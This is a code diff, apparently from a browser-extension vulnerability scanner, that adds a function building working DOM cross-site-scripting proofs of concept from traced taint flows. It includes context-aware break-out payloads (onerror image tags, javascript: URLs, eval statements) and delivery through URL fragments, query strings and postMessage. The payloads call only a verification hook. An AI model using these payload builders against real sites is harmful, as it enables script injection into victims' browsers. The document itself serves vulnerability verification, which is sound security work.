@@ -6636,10 +6636,75 @@ function _pruneProbeSessions() {
 // PoC ARTIFACT itself is no longer compiled here — the Z3 pocPlan compiler was deleted (best-design:
 // forced execution is the whole engine). session.pocJs stays null until the forced-exec PoC (provenance
 // inversion + forced-exec search + concrete-replay verify) lands and populates it.
+// Reverse a captured @S taint SHAPE into a WORKING PoC for the EXISTING verifier. The payload calls
+// apiclientsink('<marker>') — intercept.js defines that hook and relays it (content.js → PROBE_HIT),
+// so the SAME correlation path that verifies any probe confirms REAL EXPLOIT here; no parallel checker.
+// Template-FREE: the payload is COMPUTED from the sink's PARSE CONTEXT (scanned from the concrete text
+// around the hole), and the DELIVERY vector comes from the hole's SOURCE tag ({hash}/{search}/{pm}).
+// Returns {pocJs, payload, context, source, delivery} or null (with why) when the shape lacks a source.
+function _htmlHoleContext(prefix) {
+  // Walk the concrete HTML before the hole, tracking tag/attribute state, to know how the attacker
+  // input must break OUT to reach an executable position. This is observation of the real interleaving,
+  // not a signature match.
+  var inTag = false, quote = null;
+  for (var i = 0; i < prefix.length; i++) {
+    var c = prefix[i];
+    if (quote) { if (c === quote) quote = null; continue; }
+    if (inTag) { if (c === '"' || c === "'") quote = c; else if (c === '>') inTag = false; }
+    else if (c === '<') inTag = true;
+  }
+  if (quote) return quote === '"' ? "attr-dq" : "attr-sq";
+  return inTag ? "tag" : "text";
+}
+function buildPocFromShape(sinkName, shape, pageUrl, marker) {
+  if (!shape || !pageUrl) return { pocJs: null, why: "missing shape/pageUrl" };
+  var m = /\{(hash|search|pm|reply)\}/.exec(shape);   // the FIRST attacker-controlled (source-tagged) hole
+  if (!m) return { pocJs: null, why: "hole source unknown (generic {}) — no delivery vector; complete source-tagging first" };
+  var source = m[1];
+  var prefix = shape.slice(0, m.index);
+  var call = "apiclientsink('" + marker + "')";           // the verifier's proof hook (marker = crypto.randomUUID)
+  // Slash-separated attributes (no spaces) so the payload survives URL-fragment/query delivery intact.
+  var htmlCore = "<img/src=x/onerror=" + call + ">";
+  var context, payload;
+  if (sinkName === "eval") {
+    context = "js";
+    payload = call + ";//";                                // raw JS statement; trailing // neutralises the suffix
+  } else if (sinkName === "href" || sinkName === "setAttribute") {
+    context = "url";
+    payload = "javascript:" + call;                        // href/action/formaction navigation sink
+  } else {                                                 // innerHTML/outerHTML/insertAdjacentHTML/document.write
+    var hc = _htmlHoleContext(prefix);
+    context = "html-" + hc;
+    if (hc === "attr-dq") payload = '">' + htmlCore;       // break out of ="…"
+    else if (hc === "attr-sq") payload = "'>" + htmlCore;  // break out of '…'
+    else if (hc === "tag") payload = ">" + htmlCore;       // close the open tag, then inject
+    else payload = htmlCore;                               // text content: inject directly
+  }
+  // Delivery: how the attacker gets `payload` into the hole. The SAME payload string fills the hole; the
+  // vector is the source. pocJs is eval'd in the sandbox (real user gesture), so window.open is allowed.
+  var base, delivery, pocJs;
+  if (source === "hash") {
+    base = pageUrl.split("#")[0] + "#" + payload;
+    delivery = "navigate victim to a URL whose fragment is the payload";
+    pocJs = "window.open(" + JSON.stringify(base) + ', "_blank");';
+  } else if (source === "search") {
+    // location.search consumed whole → the query string IS the payload (no known param name).
+    base = pageUrl.split("#")[0].split("?")[0] + "?" + payload;
+    delivery = "navigate victim to a URL whose query string is the payload";
+    pocJs = "window.open(" + JSON.stringify(base) + ', "_blank");';
+  } else if (source === "pm") {
+    delivery = "open the victim, then postMessage the payload from the attacker window";
+    pocJs = "var w = window.open(" + JSON.stringify(pageUrl.split("#")[0]) + ', "_blank");' +
+            " setTimeout(function(){ try { w && w.postMessage(" + JSON.stringify(payload) + ', "*"); } catch (e) {} }, 800);';
+  } else {   // reply: server-reflected — needs the server to echo attacker input; can't be delivered client-side alone
+    return { pocJs: null, why: "source is a server reply (reflected) — PoC needs server-side reflection, not client delivery", source: source, payload: payload, context: context };
+  }
+  return { pocJs: pocJs, payload: payload, context: context, source: source, delivery: delivery };
+}
 function startExploitProbe(msg) {
   _pruneProbeSessions();
-  const { strategy, waitMs, findingId, paramName, fieldPath, sinkType, sinkName, decoders, preconditions, pocPlan } = msg || {};
-  if (!strategy && !pocPlan) throw new Error("strategy required (hash | search | pathname | postmessage) or pocPlan from finding.poc");
+  const { strategy, waitMs, findingId, paramName, fieldPath, sinkType, sinkName, decoders, preconditions, pocPlan, shape } = msg || {};
+  if (!strategy && !pocPlan && !shape) throw new Error("need a taint shape (from the @S finding), or a strategy / pocPlan");
   if (strategy === "search" && !paramName) {
     throw new Error("search strategy requires paramName — derive it from the finding's observed source (e.g. the argument to URLSearchParams.get)");
   }
@@ -6687,10 +6752,13 @@ function startExploitProbe(msg) {
   // cross-origin attacker context. The SAME pocJs is what the popup displays.
   // When the PoC fires the sink, intercept.js → content.js → PROBE_HIT lands on
   // this session's marker, and EXPLOIT_PROBE_STATUS reports REAL EXPLOIT.
-  // PoC compilation removed with Z3 (best-design: forced execution is the whole engine). The
-  // replacement — a WORKING PoC compiled by REVERSING the traced flow (opaque provenance inversion +
-  // forced-exec search + concrete-replay verify, no solver, no template) — is the next focused build.
-  session.pocJs = null;
+  // Compile THE PoC by REVERSING the captured @S taint shape (opaque provenance): parse context around
+  // the source-tagged hole → context-appropriate payload calling the verifier's apiclientsink(marker) →
+  // delivery from the source tag. No solver, no template. Feeds the EXISTING PROBE_HIT correlation.
+  var _poc = shape ? buildPocFromShape(sinkName || sinkType, shape, session.pageUrl, marker) : null;
+  session.pocJs = (_poc && _poc.pocJs) || null;
+  session.pocMeta = _poc ? { context: _poc.context, source: _poc.source, payload: _poc.payload, delivery: _poc.delivery } : null;
+  session.pocWhy = _poc && !_poc.pocJs ? _poc.why : null;   // @WHY when a shape can't yield a client-deliverable PoC
   session.status = "prepared";
   _probeSessions.set(marker, session);
   return session;
